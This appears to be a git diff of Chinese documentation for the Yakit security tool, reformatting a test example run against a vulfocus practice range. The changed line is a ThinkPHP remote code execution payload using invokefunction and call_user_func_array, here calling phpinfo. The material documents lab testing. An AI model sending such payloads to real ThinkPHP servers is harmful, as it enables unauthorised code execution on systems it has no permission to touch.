@@ -33,7 +33,7 @@ Yakit正在努力编写~
 **测试过程：**
 
 测试网站：vulfocus靶场
-payload：http://xx.xx.x.xx:xxx/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
+payload：`http://xx.xx.x.xx:xxx/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`
 
 ![](/img/products/yakit/Thinkphp-4.png)
 
